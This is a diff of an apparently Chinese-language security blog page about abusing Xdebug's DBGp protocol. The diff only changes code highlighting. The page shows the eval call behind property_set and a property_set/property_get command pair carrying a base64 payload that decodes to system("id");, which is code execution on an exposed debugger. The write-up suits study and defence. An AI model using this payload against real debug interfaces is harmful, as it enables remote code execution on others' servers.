@@ -40,8 +40,8 @@ Xdebug 也受限于 &lt;code>open_basedir&lt;/code>&lt;/p>
 &lt;p>&lt;strong>4. property_set&lt;/strong>&lt;/p>
 &lt;p>根据 Xdebug 实现的 dbgp 协议, property_set 存在一处执行 evel 命令的入口, 详见源码 &lt;a href="https://github.com/xdebug/xdebug/blob/master/src/debugger/handler_dbgp.c#L1628-L1630">handler_dbgp.c&lt;/a>&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">/* Do the eval */&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eval_string = xdebug_sprintf(&lt;span style="color:#cd5555">&amp;#34;%s = %s %s&amp;#34;&lt;/span>, CMD_OPTION_CHAR(&lt;span style="color:#cd5555">&amp;#39;n&amp;#39;&lt;/span>), cast_as, new_value);
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res = xdebug_do_eval(eval_string, &amp;amp;ret_zval);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>eval_string = &lt;span style="color:#008b45">xdebug_sprintf&lt;/span>(&lt;span style="color:#cd5555">&amp;#34;%s = %s %s&amp;#34;&lt;/span>, &lt;span style="color:#008b45">CMD_OPTION_CHAR&lt;/span>(&lt;span style="color:#cd5555">&amp;#39;n&amp;#39;&lt;/span>), cast_as, new_value);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res = &lt;span style="color:#008b45">xdebug_do_eval&lt;/span>(eval_string, &amp;amp;ret_zval);
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>利用方式:&lt;/p>
 &lt;pre tabindex="0">&lt;code>property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw==
 property_get -n $a -i 1 -c 1 -p 0
